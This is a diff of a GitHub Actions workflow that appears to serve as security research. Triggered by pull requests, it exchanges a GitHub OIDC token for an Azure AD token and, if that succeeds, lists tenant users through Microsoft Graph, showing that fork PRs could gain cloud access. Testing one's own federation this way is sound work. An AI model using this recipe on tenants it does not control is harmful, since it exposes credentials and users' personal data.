@@ -1,74 +1,61 @@
-name: Test Federation with Graph API
+name: Test PR Federation (Misconfig Research)
 
 on:
-  workflow_dispatch:  # Manual trigger only
+  pull_request:
+    branches: [main]
 
 permissions:
-  id-token: write   # Required to request OIDC token
+  id-token: write
   contents: read
 
 jobs:
-  test-graph-access:
+  test-pr-auth:
     runs-on: ubuntu-latest
 
     steps:
-      # ──────────────────────────────────────────────
-      # Step 1: Dump the raw OIDC token (for research)
-      # ──────────────────────────────────────────────
       - name: Dump OIDC token claims
         run: |
-          echo "=== Requesting OIDC token from GitHub ==="
+          echo "=== Requesting OIDC token ==="
+          
+          if [ -z "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
+            echo "ACTIONS_ID_TOKEN_REQUEST_URL is empty!"
+            echo "This means the workflow does NOT have id-token permissions."
+            exit 1
+          fi
+
           TOKEN=$(curl -s \
             -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
             "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" \
             | jq -r '.value')
 
           echo ""
-          echo "=== JWT Header ==="
-          echo "$TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null | jq .
-
-          echo ""
           echo "=== JWT Payload ==="
-          echo "$TOKEN" | cut -d. -f2 | tr '_-' '/+' | tr -d '\n' | base64 -d 2>/dev/null | jq .
+          echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq .
 
           echo ""
           echo "=== Key claims ==="
-          echo "$TOKEN" | cut -d. -f2 | tr '_-' '/+' | tr -d '\n' | base64 -d 2>/dev/null | jq -r '
-            "sub:                   " + .sub,
-            "repository:            " + .repository,
-            "repository_owner:      " + .repository_owner,
-            "repository_owner_id:   " + .repository_owner_id,
-            "actor:                 " + .actor,
-            "event_name:            " + .event_name,
-            "ref:                   " + .ref,
-            "head_ref:              " + (.head_ref // "null"),
-            "base_ref:              " + (.base_ref // "null")
-          '
-      # ──────────────────────────────────────────────
-      # Step 2: Exchange GitHub JWT for Azure AD token
-      # This is the actual federation step
-      # ──────────────────────────────────────────────
-      - name: Exchange OIDC token for Azure AD token (manual — to see everything)
+          PAYLOAD=$(echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null)
+          echo "sub:                   $(echo $PAYLOAD | jq -r '.sub')"
+          echo "repository:            $(echo $PAYLOAD | jq -r '.repository')"
+          echo "repository_owner:      $(echo $PAYLOAD | jq -r '.repository_owner')"
+          echo "repository_owner_id:   $(echo $PAYLOAD | jq -r '.repository_owner_id')"
+          echo "actor:                 $(echo $PAYLOAD | jq -r '.actor')"
+          echo "event_name:            $(echo $PAYLOAD | jq -r '.event_name')"
+          echo "ref:                   $(echo $PAYLOAD | jq -r '.ref')"
+          echo "head_ref:              $(echo $PAYLOAD | jq -r '.head_ref')"
+          echo "base_ref:              $(echo $PAYLOAD | jq -r '.base_ref')"
+
+      - name: Try to exchange for Azure AD token
         env:
-          AZURE_CLIENT_ID: ${{ secrets.AZURE_CLIENT_ID }}
+          AZURE_CLIENT_ID: ${{ secrets.AZURE_CLIENT_ID_PR }}
           AZURE_TENANT_ID: ${{ secrets.AZURE_TENANT_ID }}
         run: |
-          echo "=== Step A: Get GitHub OIDC token ==="
           GH_TOKEN=$(curl -s \
             -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
             "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" \
             | jq -r '.value')
-          echo "Got GitHub OIDC token (${#GH_TOKEN} chars)"
 
-          echo ""
-          echo "=== Step B: Send to Entra token endpoint ==="
-          echo "POST https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token"
-          echo "  grant_type=client_credentials"
-          echo "  client_id=$AZURE_CLIENT_ID"
-          echo "  client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer"
-          echo "  client_assertion=(the GitHub JWT)"
-          echo "  scope=https://graph.microsoft.com/.default"
-
+          echo "=== Exchanging with Entra ==="
           RESPONSE=$(curl -s -w "\n%{http_code}" \
             -X POST \
             -H "Content-Type: application/x-www-form-urlencoded" \
@@ -78,64 +65,21 @@ jobs:
           HTTP_CODE=$(echo "$RESPONSE" | tail -1)
           BODY=$(echo "$RESPONSE" | sed '$d')
 
-          echo ""
-          echo "=== Step C: Entra response (HTTP $HTTP_CODE) ==="
-
+          echo "HTTP $HTTP_CODE"
           if [ "$HTTP_CODE" = "200" ]; then
-            echo "SUCCESS — Got Azure AD access token!"
+            echo "!!! SUCCESS — Got Azure AD token from a Pull Request !!!"
             AZURE_TOKEN=$(echo "$BODY" | jq -r '.access_token')
-            EXPIRES_IN=$(echo "$BODY" | jq -r '.expires_in')
-            echo "Token length: ${#AZURE_TOKEN} chars"
-            echo "Expires in: $EXPIRES_IN seconds"
 
             echo ""
-            echo "=== Azure AD token claims (decoded) ==="
-            echo "$AZURE_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq .
+            echo "=== Calling Graph API to list users ==="
+            curl -s \
+              -H "Authorization: Bearer $AZURE_TOKEN" \
+              "https://graph.microsoft.com/v1.0/users?\$select=displayName,userPrincipalName&\$top=5" \
+              | jq '.value[]'
 
-            # Save token for next step
-            echo "AZURE_TOKEN=$AZURE_TOKEN" >> $GITHUB_ENV
+            echo ""
+            echo "AN ATTACKER COULD DO THIS FROM A FORK."
           else
-            echo "FAILED!"
+            echo "Failed (this is the safe outcome)"
             echo "$BODY" | jq .
-            exit 1
           fi
-
-      # ──────────────────────────────────────────────
-      # Step 3: Call Microsoft Graph to list users
-      # This proves the federation worked end-to-end
-      # ──────────────────────────────────────────────
-      - name: Call Graph API — List users (proof of access)
-        run: |
-          echo "=== Calling Microsoft Graph: GET /users ==="
-          echo "Authorization: Bearer <azure_token>"
-          echo ""
-
-          RESPONSE=$(curl -s \
-            -H "Authorization: Bearer $AZURE_TOKEN" \
-            -H "Content-Type: application/json" \
-            "https://graph.microsoft.com/v1.0/users?\$select=displayName,userPrincipalName,id&\$top=10")
-
-          echo "=== Users in your tenant ==="
-          echo "$RESPONSE" | jq '.value[] | {displayName, userPrincipalName, id}'
-
-          echo ""
-          echo "=== Count ==="
-          echo "$RESPONSE" | jq '.value | length' | xargs -I{} echo "{} users returned"
-
-          echo ""
-          echo "=== FEDERATION WORKS! ==="
-          echo "GitHub Actions workflow → GitHub OIDC token → Entra token exchange → Graph API call"
-          echo "No client secret was used anywhere in this flow."
-
-      # ──────────────────────────────────────────────
-      # Step 4: Also try to get tenant info
-      # ──────────────────────────────────────────────
-      - name: Call Graph API — Get organization info
-        run: |
-          echo "=== Calling Microsoft Graph: GET /organization ==="
-          RESPONSE=$(curl -s \
-            -H "Authorization: Bearer $AZURE_TOKEN" \
-            -H "Content-Type: application/json" \
-            "https://graph.microsoft.com/v1.0/organization")
-
-          echo "$RESPONSE" | jq '.value[] | {displayName, verifiedDomains, tenantType}'
